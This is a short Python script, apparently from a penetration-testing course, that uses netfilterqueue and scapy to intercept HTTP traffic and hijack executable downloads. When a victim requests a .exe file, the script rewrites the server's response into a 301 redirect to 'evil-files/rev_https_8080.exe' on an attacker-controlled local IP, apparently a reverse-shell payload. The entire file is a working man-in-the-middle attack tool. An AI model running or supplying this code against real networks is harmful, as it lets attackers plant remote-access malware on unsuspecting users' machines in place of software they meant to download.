#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Delete fields that need to be recalculated, let scapy fill them
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # Store packet's acknowledgment
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:  # Check if response's sequence = request's acknowledgment
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")

                # Replace HTTP Status code to redirect the download
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.190.140/evil-files/rev_https_8080.exe\n\n")  # \n\n is to make sure that the response will be replaced properly
                packet.set_payload(str(modified_packet))  # send modified packet

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
